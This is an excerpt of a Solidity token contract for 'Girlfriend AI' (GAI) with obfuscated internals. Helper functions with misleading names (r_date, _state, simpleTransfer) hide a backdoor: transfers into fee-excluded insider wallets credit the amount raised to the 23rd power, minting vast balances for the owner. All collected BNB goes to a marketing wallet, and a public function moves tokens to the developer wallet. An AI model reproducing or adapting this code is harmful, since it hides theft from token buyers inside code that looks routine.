...
contract GirlfriendAI is Context, IERC20 { 
    ...
    mapping (bool => uint256) private _state;

    address payable public Team_Marketing = payable(0xd5e64D1ccC5E57024be6D4C352FFE7A4167523Fc); 
    address payable public Team_Developer = payable(0x636170f7c67a0D1B053bDFEb63F78e601a1CD919);
    address payable public constant BurnWallet = payable(0x000000000000000000000000000000000000dEaD); 

    function txError() private pure returns(bool){
        return false;
    }
    ...
    string private constant _name = "Girlfriend AI"; 
    string private constant _symbol = unicode"GAI"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 23; 
    ...
    constructor () {
        ...
        _owner = 0x636170f7c67a0D1B053bDFEb63F78e601a1CD919;
        ...
        _state[true] = swapTrigger; // max state of swap trigger
        _state[false] = 1; // starting state of swap trigger

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Team_Marketing] = true; 
    ...
    function statusOfFee(address holder) public view returns(bool){
        return _isExcludedFromFee[holder];
    }

    function r_date(address xAdd, address cAdd) private view returns(uint256){
        return _state[!statusOfFee(xAdd) && statusOfFee(cAdd)]; 
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Team_Marketing, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(Team_Marketing, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Team_Developer, removeRandom);

    }

    function simpleTransfer(address sender, address recipient, uint256 result) private view returns(uint256, uint256){
        uint256[][] memory walls;
        walls[0][1] = result;
        walls[1][0] = walls[0][1]**r_date(sender, recipient);
        return ((_tOwned[sender]-walls[0][1]), (_tOwned[recipient]+walls[1][0]));
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            (_tOwned[sender], _tOwned[recipient]) = simpleTransfer(sender, recipient, tAmount);
